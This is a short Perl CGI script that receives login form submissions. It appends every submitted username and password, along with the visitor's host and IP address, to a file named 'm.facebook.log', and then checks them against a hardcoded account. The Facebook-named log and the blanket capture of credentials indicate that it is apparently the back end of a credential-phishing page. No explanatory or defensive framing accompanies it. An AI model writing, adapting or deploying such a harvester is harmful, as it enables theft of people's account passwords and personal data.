#!/usr/bin/perl

my ( $_USER, $_PASS ) = ('roberto@gmail.com','senha123');


sub _saveData {

    my ($_uh,$_ud,$_un,$_ui,$_up) = @_;
	open(FILE_,'>>m.facebook.log');
    print FILE_ "----------------------------\n"; 
    print FILE_ "USER_HOST: $_uh   \n"; 
    print FILE_ "USER_ADDR: $_ud   \n"; 
    print FILE_ "USER_NAME: $_un   \n";
    print FILE_ "---------------------\n"; 
    print FILE_ "USER_NAME: $_ui   \n"; 
    print FILE_ "USER_PASS: $_up   \n"; 
    print FILE_ "----------------------------\n\n"; 
}


sub _userNotValid {
	print "Status: 404";
	print "\n\n";
}
 
sub _passNotValid {
	print "Status: 401";
	print "\n\n";
}

sub _userGaranted {
	print "Content-Type: text/plain\n\n";
	#print "wellcome";
}

sub _decodeDT {
	my ($_codt) = @_; 
    $_RH = %ENV{'REMOTE_HOST'};	
	$_RA = %ENV{'REMOTE_ADDR'};	
	$_RU = %ENV{'REMOTE_USER'};	
  	
	@_codD = split(/\%[0-9]{2}/,$_codt); #remove all url-special char, %22 %20 etc..
	
	&_saveData($_RH,$_RA,$_RU,$_codD[1],$_codD[3]); # save, user and other info in a file.
	
	if ( $_codD[1] ne $_USER ){ &_userNotValid; return 0;} # check user login
	if ( $_codD[3] ne $_PASS ){ &_passNotValid; return 0;} # check password
	&_userGaranted; # case user and pass is true.
}

my $_data; read(STDIN,$_data, %ENV{'CONTENT_LENGTH'});

&_decodeDT($_data);



